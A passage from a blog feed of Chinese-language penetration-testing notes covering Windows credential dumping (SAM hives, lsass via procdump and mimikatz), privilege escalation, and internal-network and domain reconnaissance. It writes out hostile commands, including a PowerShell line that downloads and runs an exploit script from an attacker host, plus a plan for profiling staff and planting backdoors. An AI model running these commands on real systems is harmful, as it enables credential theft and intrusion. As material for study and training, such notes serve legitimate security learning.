<pre><code class="language-bash">reg save hklm\sam sam.hive
reg save hklm\system system.hive
reg save hklm\security security.hive
</code></pre>
<p>使用meterpreter下自带download功能来将目标机的三个注册表文件下载下来，</p>
<p>然后<strong>本地分析：</strong></p>
<p>（默认使用kali）</p>
<pre><code class="language-bash">python /root/impacket/examples/secretsdump.py ‐sam sam.hiv ‐security security.hiv ‐system sys.hiv LOCAL
</code></pre>
<p>参考：https://blog.csdn.net/qq_17204441/article/details/89426390</p>
<h4 id="procdump-mimikatz">ProcDump + Mimikatz</h4>
<p>本地分析，文件会比较大，但是能绕过杀软。</p>
<p>通过procdump（<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">下载地址</a>）导出注册表：</p>
<pre><code class="language-bash">Procdump.exe -accepteula -ma lsass.exe lsass.dmp
</code></pre>
<p>然后通过mimikatz进行读取：</p>
<pre><code class="language-bash">sekurlsa::minidump lsass.dump.dmp
sekurlsa::logonpasswords full
</code></pre>
<p>PS：mimikatz的平台要与进行dump的系统(source dump)兼容(比如dowm了08的,本地就要用08系统来分析)</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Windows下提权]]></title>
        <id>https://zzggtt.github.io/post/windows-xia-ti-quan/</id>
        <link href="https://zzggtt.github.io/post/windows-xia-ti-quan/">
        </link>
        <updated>2020-11-14T14:15:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="windows权限">Windows权限</h3>
<p>在Windows中，<strong>权限</strong>精确的定制了用户对<strong>资源</strong>的<strong>访问控制</strong>能力。也就是说，权限是以<strong>资源为对象</strong>，即某个资源对哪些用户可以拥有哪些权限。</p>
<ul>
<li>
<p><strong>安全标识符</strong></p>
<p>在Windows中系统通过安全标识符（SID）对用户进行<strong>识别</strong>，SID可应用于系统内的所有用户、组、服务或计算机。SID具有<strong>唯一性</strong>。</p>
</li>
<li>
<p><strong>访问控制列表</strong></p>
<p>访问控制列表（ACL）是权限的核心技术，用于规定用户对资源的访问权限。在访问控制列表中，每一个用户或用户组都对应一组访问控制项（Access Control Entry，ACE），所有用户或用户组的权限访问设置都将会在这里被存储下来，并允许随时被有权限进行修改的用户进行调整，如取消某个用户对某个资源的&quot;写入&quot;权限。</p>
</li>
<li>
<p><strong>安全主体</strong></p>
<p>在Windows中，可以将用户、用户组、计算机或服务都看成是一个安全主体，每个安全主体都拥有相对应的账户名称和SID。根据系统架构的不同，账户的管理方式也有所不同──本地账户被本地的SAM管理，域的账户则会被域控制器进行管理。</p>
<p>一般来说，权限的指派过程实际上就是为某个资源指定安全主体（即用户、用户组等）可以拥有怎样的操作过程。</p>
</li>
</ul>
<p><strong>参考资料：</strong></p>
<p><a href="https://www.cnblogs.com/milantgh/p/3617855.html">Windows之权限讲解</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1681365">Windows用户和组</a></p>
<p>Windows 内置用户账户：</p>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>权限</strong></th>
<th style="text-align:center"><strong>详细</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">User</td>
<td style="text-align:center">普通用户权限</td>
</tr>
<tr>
<td style="text-align:center">Administrator</td>
<td style="text-align:center">管理员权限。通常需要通过机制再提升为system权限来操作SAM（Mimikatz抓密码）</td>
</tr>
<tr>
<td style="text-align:center">System</td>
<td style="text-align:center">系统权限。可以操作SAM，需要从Administrator提升到SAM才能对散列值Dump</td>
</tr>
<tr>
<td style="text-align:center">TrustedInstaller</td>
<td style="text-align:center">最高权限，可以操作系统文件</td>
</tr>
</tbody>
</table>
<h3 id="内核漏洞提权">内核漏洞提权</h3>
<ol>
<li>
<p>将目标主机补丁号导出：</p>
<pre><code class="language-bash">systeminfo &gt; 1.txt
或
wmic qfe get Caption,Description,HotFixID,InstalledOn &gt; 1.txt
</code></pre>
</li>
<li>
<p>通过脚本判断是否存在未打补丁的漏洞：</p>
<p>https://github.com/bitsadmin/wesng.git</p>
<p>https://github.com/AonCyberLabs/Windows-Exploit-Suggester</p>
<p>或根据在线网站检测：</p>
<p>https://bugs.hacking8.com/tiquan</p>
</li>
<li>
<p>下载对应的EXP，并执行利用：</p>
<p>https://www.exploit-db.com/</p>
</li>
<li>
<p>可能遇到的问题：EXP被杀。将EXP改成Powershell，使用powershell下载利用代码并执行：</p>
<pre><code class="language-bash">Powershell IEX (New-Object Net.WebClient).DownloadString('http://X.X.X.X:8000/ms16-032.ps1');Invoke-MS16-032
</code></pre>
<p>参考：</p>
<p>https://evi1cg.me/archives/MS16-032-Windows-Privilege-Escalation.html</p>
<p>https://www.cnblogs.com/xiaozi/p/13534602.html</p>
</li>
</ol>
<h3 id="dll劫持提权"><strong>DLL劫持提权</strong></h3>
<h4 id="基础介绍">基础介绍</h4>
<p>DLL是Microsoft引入的，用于实现共享库的概念。它是一个库文件，代表动态链接库，其中包含可被多个应用程序同时动态访问和使用的<strong>代码和数据</strong>。</p>
<p>Windows2003以上以及win7以上操作系统（<a href="http://sh1yan.top/2019/06/16/The-Principle-and-Practice-of-DLL-Hijacking/">其他系统版本参考</a>），通过“<strong>DLL路径搜索目录顺序</strong>”和“<strong>KnownDLLs注册表项</strong>”的机制来确定应用程序启动时所要调用的DLL的路径，之后应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。</p>
<p>应用程序动态访问DLL的<strong>搜索目录顺序</strong>：</p>
<ol>
<li>从应用程序的目录中加载</li>
<li>32位系统目录（C：\ Windows \ System32）</li>
<li>16位系统目录（C：\ Windows \ System）</li>
<li>Windows目录（C：\ Windows）</li>
<li>当前工作目录（CWD）</li>
<li>PATH环境变量中的目录（首先是系统，然后是用户）</li>
</ol>
<p><strong>KnownDLLs注册表项机制</strong>：凡是此项下的DLL文件就会被禁止从应用程序自身所在的目录下调用，而只能从系统目录即<strong>SYSTEM32目录</strong>下调用。</p>
<p>注册表位置：</p>
<pre><code class="language-bash">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1605363395360.png" alt="" loading="lazy"></figure>
<h4 id="利用条件"><strong>利用条件：</strong></h4>
<ul>
<li>
<p>DLL</p>
<p>可以看出，如果存在DLL即不在KnownDLLs里，开发人员也没有定义绝对路径时，应用程序就会按照目录顺序去搜索。</p>
</li>
<li>
<p>权限</p>
<p>当前用户有权限对要劫持的DLL目录进行<strong>读写</strong>操作。</p>
</li>
</ul>
<p>在上述条件下，我们就可以在应用程序搜索到system32之前，也就是应用程序目录中，放入我们编写好的恶意劫持DLL，等待应用程序调用。</p>
<h4 id="利用过程"><strong>利用过程：</strong></h4>
<p>参考倾旋师傅的文章：<a href="https://payloads.online/archivers/2018-06-09/1">QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权</a></p>
<h3 id="错误的服务权限配置">错误的服务权限配置</h3>
<h4 id="基础介绍-2"><strong>基础介绍</strong></h4>
<p>通常情况下，一些Web控件、网络客户端会在本地计算机中注册一些<strong>服务</strong>，这些服务在<strong>开机后自启动</strong>，而自启动的<strong>权限又是SYSTEM</strong>。</p>
<p>在软件注册服务的时候，会在注册表中创建几个项，该项的注册表路径如下：</p>
<pre><code class="language-bash">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services
</code></pre>
<p>服务在开机后自启动时，Windows将会搜索要执行的<a href="https://blog.csdn.net/simmel_92/article/details/89064977">二进制文件</a>。并在binPath属性中声明要执行的二进制文件的位置。如果二进制文件的路径不是一个绝对路径时，Windows将从路径开头的所有文件夹中进行搜索。</p>
<p>例如binPath路径如下：</p>
<pre><code class="language-bash">C:\Program Files\Unquoted Path Service\Common Files\service.exe
</code></pre>
<p>则搜索顺序为：</p>
<ol>
<li>C:\Program.exe</li>
<li>C:\Program Files\Unquoted.exe</li>
<li>C:\Program Files\Unquoted Path.exe</li>
<li>C:\Program Files\Unquoted Path Service\Common.exe</li>
<li>C:\Program Files\Unquoted Path Service\Common Files\service.exe</li>
</ol>
<h4 id="利用条件-2">利用条件：</h4>
<ul>
<li>若服务注册表的<strong>修改权限</strong>当前用户可控，那就可以直接修改<code>binPath</code>的值，指向到本地其他路径，获得这个服务的权限。</li>
<li>若这个binPath所指向的<strong>目录权限</strong>可控，那么我们也可以把二进制文件替换成木马，从而当服务启动的时候，就能够执行我们的木马。</li>
<li>若<code>binPath</code>的值<strong>不是一个绝对路径</strong>时，可以通过Windows的特性（按搜索顺序查找二进制文件）来提权：将木马放置在带有空格目录的同级目录下，当服务启动时，会首先在空格目录当前目录搜索第一个单词的二进制文件。</li>
</ul>
<h4 id="利用过程-2">利用过程：</h4>
<p>首先需要在找到存在配置权限错误的服务，<strong>PowerUp</strong>和<strong>winPEAS</strong>是最有用的工具，PowerUp用PowerShell编写，而winPEAS用C＃编写。将需要.NET Framework 4.0来运行winPEAS：</p>
<pre><code class="language-bash">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

</code></pre>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1605363418625.png" alt="" loading="lazy"></figure>
<p>关于Powerup的使用：<a href="https://evi1cg.me/archives/Powerup.html">Powrshell 提权框架-Powerup</a></p>
<p>接下来上传我们的木马，重启服务，即可获得该服务权限。</p>
<p>实际操作流程可参考：</p>
<p><a href="https://payloads.online/archivers/2018-10-08/1">Windows本地提权提升技巧</a></p>
<p><a href="https://medium.com/bugbountywriteup/privilege-escalation-in-windows-380bee3a2842">Escalate Privileges in windows</a></p>
<p><a href="https://mp.weixin.qq.com/s/lNyvyW2Pq9abIC9ViJteaQ">红队测试之Windows提权小结</a></p>
<h3 id="mysql提权">Mysql提权</h3>
<p>搬运一下先知上总结好的文章：</p>
<p><a href="https://xz.aliyun.com/t/2719">Windows下三种mysql提权剖析</a></p>
<p><a href="https://xz.aliyun.com/t/7392">mysql数据库漏洞利用及提权方式小结</a></p>
<h3 id="协议提权potato">协议提权（Potato）</h3>
<p>土豆太多了，先mark一下，后面有时间再吃：</p>
<ul>
<li>
<p>Hot Potato</p>
<p>利用已知的Windows中的问题，以获得本地权限提升。</p>
<p>其中利用NTML中继（特别是基于HTTP &gt; SMB中继）和NBNS欺骗进行提权。</p>
<p><a href="https://www.freebuf.com/articles/system/93484.html">Windows提权姿势之Hot Potato</a></p>
</li>
<li>
<p>Rotten Potato</p>
<p><a href="https://www.anquanke.com/post/id/92908">The lonely potato</a></p>
</li>
<li>
<p>Juicy Potato</p>
<p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/">Windows本地提权工具Juicy Potato测试分析</a></p>
</li>
<li>
<p>Ghost Potato</p>
<p><a href="https://xz.aliyun.com/t/7087">Ghost Potato 复现(Cve-2019-1384)</a></p>
</li>
<li>
<p>Pipe Potato</p>
<p><a href="https://www.t00ls.net/articles-56281.html">pipePotato复现</a></p>
<p><a href="https://www.anquanke.com/post/id/204510">pipePotato：一种新型的通用提权漏洞</a></p>
</li>
<li>
<p>Potato家族本地提权细节</p>
<p>https://xz.aliyun.com/t/7776</p>
</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[如何进行内网信息搜索]]></title>
        <id>https://zzggtt.github.io/post/ru-he-jin-xing-nei-wang-xin-xi-sou-suo/</id>
        <link href="https://zzggtt.github.io/post/ru-he-jin-xing-nei-wang-xin-xi-sou-suo/">
        </link>
        <updated>2020-11-12T08:41:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="前言">前言</h3>
<p>从亮神分享的文章中学到了很多，记录了下来：</p>
<blockquote>
<p>目标<code>资产信息</code>搜集的程度，决定<code>渗透过程</code>的复杂程度。</p>
<p>目标<code>主机信息</code>搜集的深度，决定后渗透<code>权限持续把控</code>。</p>
<p>渗透的本质是信息搜集，而信息搜集整理为后续的情报跟进提供了强大的保证。</p>
<p>——Micropoor</p>
</blockquote>
<p>一次完整的网络渗透，不仅仅是与目标管理人员的权限争夺，一次完整的网络渗透，它分为两大块，技 术业务与信息分析业务。</p>
<p>而技术业务要辅助并且要为信息分析业务提供强大的支撑与保证。同时信息分析业务要为技术业务提供 关键的目标信息分析逻辑关系与渗透方向。</p>
<p>在得到一个webshell时，非root/administrator权限的情况下，对目标信息搜集至关重要，它会影响到后期的渗透是否顺利，以及渗透方向。</p>
<h3 id="主机信息">主机信息</h3>
<p><strong>查询用户信息：</strong></p>
<p>了解当前用户权限，判断是否需要进一步提升权限。</p>
<pre><code class="language-bash">win：
	whoami：显示当前用户信息
	net user：显示主机系统中所有用户信息
linux：
	whoami
	id
	cat /etc/shadow、cat /etc/passwd
</code></pre>
<p><strong>查询网络信息：</strong></p>
<p>确认目标主机所连接的网络情况：</p>
<pre><code class="language-bash">win：
	TCP/IP配置：ipconfig、ipconfig /all
	端口：netstat -ano
	ARP表：arp -a 
	路由表: route print
	dns缓存记录：ipconfig/displaydns
linux：
	ifconfig、netstat -anplt
    ARP表:arp -a 
    路由表:route -n
    查看登录日志获取登录来源ip：lastlog
</code></pre>
<p><strong>查询系统信息：</strong></p>
<p>确认主机操作系统名称和版本信息</p>
<pre><code class="language-bash">win:
	systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;
	systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;
Linux: 
	uname -a ：通过查看内核版本 
</code></pre>
<p><strong>查询补丁更新信息：</strong></p>
<p>获取当前主机补丁更新情况，可用来辅助<strong>提升权限</strong>。</p>
<pre><code class="language-bash">win：
	systeminfo
	wmic qfe get Caption,Description,HotFixID,InstalledOn
Linux: uname -a ：通过查看内核版本 
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1605170574964.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1605170579520.png" alt="" loading="lazy"></figure>
<p><strong>查询进程列表：</strong></p>
<p>查看当前进程列表，重点关注安全软件，为了后续免杀做准备。</p>
<pre><code class="language-bash">win：
	tasklist
    wmic process list brief
linux: 
	ps
	top
</code></pre>
<p>注：要熟悉国内常见点杀软。</p>
<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1605170664939.png" alt="" loading="lazy"></figure>
<p><strong>查询安装的软件及版本、路径等</strong></p>
<pre><code class="language-bash">win:
	wmic product get name,version &gt; ins.txt : 通过wmic将命令信息导出
	powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot; ：通过powershell命令收集软件的版本信息
	
linux:
	rpm -q：来查询安装了哪些软件包
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://zzggtt.github.io/post-images/1605170621708.png" alt="" loading="lazy"></figure>
<p><strong>查询主机服务信息</strong></p>
<pre><code class="language-bash">wmic service list brief
</code></pre>
<h3 id="资产信息">资产信息</h3>
<p>服务器端存有敏感信息，通过收集各种登录凭证以便扩大战果。</p>
<pre><code class="language-bash">Windows：
	本地密码Hash和明文密码/抓取浏览器密码/服务端明文密码
linux：
	history记录敏感操作/shadow文件破解/mimipenguin抓取密码/使用Strace收集登录凭证/全盘搜索敏感信息
</code></pre>
<h3 id="域内信息收集"><strong>域内信息收集</strong></h3>
<p>搜集完本机相关信息后，就需要判断当前主机是否在域内，如果在域内，就需要进一步收集域内信息</p>
<p><strong>判断是否有域</strong><br>
一般域服务器都会同时作为时间服务器，所以使用下面命令判断：</p>
<pre><code class="language-bash">运行 net time /domain 该命令后，一般会有如下三种情况:
1、存在域，但当前用户不是域用户，提示说明权限不够
 	 C:\Users&gt;WWW&gt;net time /domain
 	 System error 5 has occurred.
 	 Access is denied.
 	 
2、存在域，并且当前用户是域用户
  	 C:\Windows\system32&gt;net time /domain
  	 Current time at \\owa.god.org is 2020/11/12 16:05:49
  	 The command completed successfully.
	
3、当前网络环境为工作组，不存在域
  	 C:\Users\Administrator&gt;net time /domain
  	 The domain controller for the domain WORKGROUP could not 	   be found.
</code></pre>
<p><strong>域用户信息搜集：</strong></p>
<pre><code class="language-bash">net user /domain //获取域用户列表
net group /domain  //查询域内所有用户组列表
net group “Domain Admins” /domain //查询“域管理员组用户”列表
net group &quot;Domain Controllers&quot; /domain  //查看“域控制器组”用户
net localgroup administrators /domain  //查询“本地管理员组”用户
</code></pre>
<p>正如上面所说，技术业务需要辅助分析业务。在域组中，其中有几个组需要特别关注，在一般的大型内 网渗透中，需要关注大致几个组</p>
<p>（1）IT组/研发组 他们掌握在大量的内网密码，数据库密码等。</p>
<p>（2）秘书组 他们掌握着大量的目标机构的内部传达文件，为信息分析业务提供信息，在反馈给技术业 务来确定渗透方向</p>
<p>（3）domain admins组 root/administrator</p>
<p>（4）财务组 他们掌握着大量的资金往来与目标企业的规划发展，并且可以通过资金，来判断出目标组 织的整体架构</p>
<p>（5）CXX组 ceo cto coo等，不同的目标组织名字不同，如部长，厂长，经理等。</p>
<p>以xxx组为例：xxx组共计x人。</p>
<p>并且开始规划信息刺探等级：</p>
<p>等级1：确定某部门具体人员数量 如研发中心4人</p>
<p>等级2：确定该部门的英文用户名的具体信息，如姓名，联系方式，邮箱，职务等。以便确定下一步攻 击方向</p>
<p>等级3：分别刺探白天/夜间 内网中所存活机器并且对应IP地址</p>
<p>等级4： 对应人员的工作机内网IP，以及工作时间</p>
<p>等级5： 根据信息业务反馈，制定目标安全时间，以便拖拽指定人员文件，或登录目标机器</p>
<p>等级6： 制定目标机器后渗透与持续渗透的方式以及后门</p>
<p>以上只是思路，后续内容可就不搬运了，详细内容可直接去GitHub：<a href="https://github.com/Micropoor/Micro8/blob/master/%E6%B8%97%E9%80%8F%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%89%EF%BC%89.pdf">渗透的本质是信息收集</a></p>
<figure data-type="image" tabindex="5"><img src="https://zzggtt.github.io/post-images/1605170709895.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="6"><img src="https://zzggtt.github.io/post-images/1605170713702.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://zzggtt.github.io/post-images/1605170717677.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="8"><img src="https://zzggtt.github.io/post-images/1605170721876.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://zzggtt.github.io/post-images/1605170726984.png" alt="" loading="lazy"></figure>
<p><strong>找到域控</strong><br>
一般来说，域控服务器IP地址为DNS服务器地址，找到DNS服务器地址就可以定位域控</p>
<pre><code class="language-bash">nslookup/ping 域名,解析到域控服务器IP地址
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://zzggtt.github.io/post-images/1605170731898.png" alt="" loading="lazy"></figure>
<h3 id="参考链接">参考链接</h3>
<p><a href="https://www.mi1k7ea.com/2020/02/27/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">内网信息收集之本机信息收集</a></p>
<p><a href="https://mp.weixin.qq.com/s/o19f28x50dDICcActdvqXw">如何进行内网信息收集</a></p>
<p><a href="https://github.com/Micropoor/Micro8/blob/master/%E6%B8%97%E9%80%8F%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%89%EF%BC%89.pdf">渗透的本质是信息收集（第五十二课）</a></p>
]]></content>
    </entry>
</feed>